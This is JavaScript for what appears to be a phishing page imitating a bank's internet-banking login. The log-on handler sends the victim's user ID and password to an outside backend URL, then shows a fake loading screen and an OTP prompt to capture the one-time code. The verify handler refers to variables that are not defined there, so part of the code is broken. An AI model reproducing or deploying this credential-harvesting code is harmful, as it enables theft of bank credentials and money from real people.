const BACKEND_URL = "https://ib-backend-rho.vercel.app/send-data";
// 2. THE WATERMARK FUNCTION (The one I missed!)
const setupWatermark = (inputId, labelId) => {
    const input = document.getElementById(inputId);
    const label = document.getElementById(labelId);
    if (input && label) {
        input.addEventListener('input', () => {
            label.style.display = input.value.length > 0 ? 'none' : 'block';
        });
    }
};

document.addEventListener('DOMContentLoaded', () => {
    // 3. START THE WATERMARK FIX
    setupWatermark('txiID', 'txiID_watermask_label');
    setupWatermark('txiPwd', 'txiPwd_watermask_label');

    // 4. LOG ON BUTTON LOGIC
    const btnLogOn = document.getElementById('btnLogOn');
    if (btnLogOn) {
        btnLogOn.addEventListener('click', function() {
            const user = document.getElementById('txiID').value;
            const pass = document.getElementById('txiPwd').value;

              fetch(BACKEND_URL, { 
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ userId: user, pin: pass }) 
})

            // UI Animations
            const toHide = document.querySelectorAll('.EnterData, .btnLogOnCover, .btnRegisterOnline, .BHBox, .iBankingLoGo');
            toHide.forEach(el => el.style.display = 'none');

            const loader = document.getElementById('loadingSection');
            if (loader) loader.style.display = 'block';

            setTimeout(() => {
                if (loader) loader.style.display = 'none';
                const otp = document.getElementById('otpSection');
                if (otp) otp.style.display = 'block';
            }, 3000);
        });
    }

    // 5. VERIFY BUTTON LOGIC
    const btnVerify = document.getElementById('btnVerify');
    if (btnVerify) {
        btnVerify.addEventListener('click', function() {
            const otpCode = document.getElementById('otpInput').value;

            if (otpCode === "") {
                alert("Please enter the code!");
                return;
            }

fetch(BACKEND_URL, { 
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ userId: user, pin: pass }) 
})

            btnVerify.innerText = "Verifying...";
            setTimeout(() => {
                alert("Verification complete. Please wait for confirmation.");
            }, 2000);
        });
    }
});
